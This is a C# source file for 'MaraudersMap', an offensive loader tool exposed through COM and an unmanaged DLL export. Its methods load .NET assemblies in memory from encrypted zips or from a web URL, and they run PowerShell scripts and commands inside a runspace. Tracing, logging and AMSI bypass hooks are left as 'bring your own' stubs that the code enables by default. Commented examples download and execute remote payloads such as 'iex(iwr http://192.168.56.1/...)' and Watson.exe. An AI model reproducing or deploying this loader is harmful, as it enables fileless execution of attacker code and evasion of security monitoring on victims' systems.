using System;
using System.IO;
using Ionic.Zip;
using System.Management.Automation;
using System.Reflection;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;


namespace MaraudersMap
{
    [ComVisible(true), ClassInterface(ClassInterfaceType.AutoDual)]
    public class MaraudersMap
    {
        public static void PrintBanner(string filePath)
        {
            string banner = @"

 





  __  __                           _                                       
 |  \/  |                         | |                                      
 | \  / | __ _ _ __ __ _ _   _  __| | ___ _ __ ___   _ __ ___   __ _ _ __  
 | |\/| |/ _` | '__/ _` | | | |/ _` |/ _ \ '__/ __| | '_ ` _ \ / _` | '_ \ 
 | |  | | (_| | | | (_| | |_| | (_| |  __/ |  \__ \ | | | | | | (_| | |_) |
 |_|  |_|\__,_|_|  \__,_|\__,_|\__,_|\___|_|  |___/ |_| |_| |_|\__,_| .__/ 
                                                                    | |    
                                                                    |_|
- I solemnly swear I am up to no good

  by jfmaes


";
            File.AppendAllText(filePath, banner);
        }

        /* public static void Main(String[] args)
         {
             // RunBinaryFromEncryptedZip(@"G:\DETONATIONZONE\sharpies.txt", "malware", @"G:\DETONATIONZONE\watson.txt", "Watson.exe", "");
             //RunPowerShellScriptFromEncryptedZip(@"G:\DETONATIONZONE\Invoke-SayHello.zip", "hello", @"G:\DETONATIONZONE\hello.txt", "Invoke-SayHello.ps1", "Invoke-SayHello -Command jean");
             // RunPowerShellCommand("iex(iwr http://192.168.56.1/Invoke-SayHello.ps1);Invoke-SayHello -Command Jean", @"G:\DETONATIONZONE\commandoutput.txt");
             //RunBinaryFromWeb("https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_Any/Watson.exe?raw=true", @"G:\watson.txt", "");
         }*/

        static void NoMoreTracingFunction()
        {
            throw new NotImplementedException("bring your own :)");
        }

        static void bypassAntiMalwareScanningInterfaceForSharpiesFunction()
        {
            throw new NotImplementedException("bring your own :)");
        }



        public void RunBinaryFromEncryptedZip(string zip, string password, string outfile, string binName, string arguments, bool NoMoreTracing = true, bool bypassAntiMalwareScanningInterfaceForSharpies = true)
        {
            try
            {
                if (!ZipFile.IsZipFile(zip))
                {
                    throw new ArgumentException("You did not provide a path to a valid zipfile, check if zip is valid or if the zip argument is missing.", zip);
                }

                byte[] assemblyBytes;
                MemoryStream ms = new MemoryStream();
                ZipFile zipfile = ZipFile.Read(zip);
                bool found = false;
                foreach (ZipEntry entry in zipfile)
                {
                    if (binName == entry.FileName)
                    {
                        entry.ExtractWithPassword(ms, password);
                        found = true;
                        break;
                    }
                }

                if (!found)
                {
                    throw new ArgumentException("{0} was not found in the zip entries.", binName);
                }

                assemblyBytes = ms.ToArray();
                object[] convertedArgs = arguments.Split(' ');
                MemoryStream mem = new MemoryStream(10000);
                StreamWriter writer = new StreamWriter(mem);
                Console.SetOut(writer);
                if (NoMoreTracing)
                {
                    NoMoreTracingFunction();
                }

                if (bypassAntiMalwareScanningInterfaceForSharpies)
                {
                    bypassAntiMalwareScanningInterfaceForSharpiesFunction();
                }

                Reflect.loadAssemblyFromEntryPoint(assemblyBytes, convertedArgs);
                writer.Close();
                string s = Encoding.Default.GetString(mem.ToArray());
                mem.Close();
                File.WriteAllText(outfile, s.ToString());
            }
            catch (Exception e)
            {
                File.WriteAllText(outfile, e.Message);
            }
            finally
            {
                PrintBanner(outfile);
            }
        }


        public void RunBinaryFromWeb(string url, string outfile, string arguments, bool NoMoreTracing = true, bool bypassAntiMalwareScanningInterfaceForSharpies = true)
        {
            try
            {
                byte[] assemblyBytes;
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                WebClient client = new WebClient();
                assemblyBytes = client.DownloadData(url);
                object[] convertedArgs = arguments.Split(' ');
                MemoryStream mem = new MemoryStream(10000);
                StreamWriter writer = new StreamWriter(mem);
                Console.SetOut(writer);
                if (NoMoreTracing)
                {
                    NoMoreTracingFunction();
                }

                if (bypassAntiMalwareScanningInterfaceForSharpies)
                {
                    bypassAntiMalwareScanningInterfaceForSharpiesFunction();
                }
                Reflect.loadAssemblyFromEntryPoint(assemblyBytes, convertedArgs);
                writer.Close();
                string s = Encoding.Default.GetString(mem.ToArray());
                mem.Close();
                File.WriteAllText(outfile, s.ToString());
            }
            catch (Exception e)
            {
                File.WriteAllText(outfile, e.Message);
            }
            finally
            {
                PrintBanner(outfile);
            }

        }

        /*largely taken from https://github.com/mdsecactivebreach/SharpPack/blob/master/SharpPack.cs*/

        public void RunPowerShellScriptFromEncryptedZip(string zip, string password, string outfile, string scriptName, string arguments, bool bypassLogging = true, bool bypassAntiMalwareScanningInterface = true)
        {
            try
            {
                if (!ZipFile.IsZipFile(zip))
                {
                    throw new ArgumentException("You did not provide a path to a valid zipfile, check if zip is valid or if the zip argument is missing.", zip);
                }

                byte[] poshBytes;
                MemoryStream ms = new MemoryStream();
                ZipFile zipfile = ZipFile.Read(zip);
                bool found = false;
                foreach (ZipEntry entry in zipfile)
                {
                    if (scriptName == entry.FileName)
                    {
                        entry.ExtractWithPassword(ms, password);
                        found = true;
                        break;
                    }
                }

                if (!found)
                {
                    throw new ArgumentException("{0} was not found in the zip entries.", scriptName);
                }

                poshBytes = ms.ToArray();
                string PowerShellCode = System.Text.Encoding.UTF8.GetString(poshBytes);
                PowerShellCode += "\n" + arguments;
                if (PowerShellCode == null || PowerShellCode == "") return;
                using (PowerShell ps = PowerShell.Create())
                {
                    BindingFlags flags = BindingFlags.NonPublic | BindingFlags.Static;
                    if (bypassLogging)
                    {

                        throw new NotImplementedException("bring your own :)");
                    }

                    if (bypassAntiMalwareScanningInterface)
                    {
                        throw new NotImplementedException("bring your own :)");
                    }

                    ps.AddScript(PowerShellCode);
                    var results = ps.Invoke();
                    string output = String.Join(Environment.NewLine, results.Select(R => R.ToString()).ToArray());
                    ps.Commands.Clear();
                    File.WriteAllText(outfile, output);
                    ps.Dispose();
                }
            }
            catch (Exception e)
            {
                File.WriteAllText(outfile, e.Message);
            }
            finally
            {
                PrintBanner(outfile);
            }
        }

        public void RunPowerShellCommand(string command, string outfile, bool bypassLogging = true, bool bypassAntiMalwareScanningInterface = true)
        {
            try
            {
                using (PowerShell ps = PowerShell.Create())
                {
                    BindingFlags flags = BindingFlags.NonPublic | BindingFlags.Static;
                    if (bypassLogging)
                    {
                        throw new NotImplementedException("bring your own :)");
                    }

                    if (bypassAntiMalwareScanningInterface)
                    {
                        throw new NotImplementedException("bring your own :)");
                    }

                    ps.AddScript(command);
                    var results = ps.Invoke();
                    string output = String.Join(Environment.NewLine, results.Select(R => R.ToString()).ToArray());
                    ps.Commands.Clear();
                    File.WriteAllText(outfile, output);
                    ps.Dispose();

                }
            }
            catch (Exception e)
            {
                File.WriteAllText(outfile, e.Message);
            }
            finally
            {
                PrintBanner(outfile);
            }
        }
    }

    static class UnmanagedExports
    {
        [DllExport("ISolemnlySwearIAmUpToNoGood", CallingConvention = CallingConvention.StdCall)]

        [return: MarshalAs(UnmanagedType.IDispatch)]
        static Object ISolemnlySwearIAmUpToNoGood()
        {
            return new MaraudersMap() { };
        }
    }

}
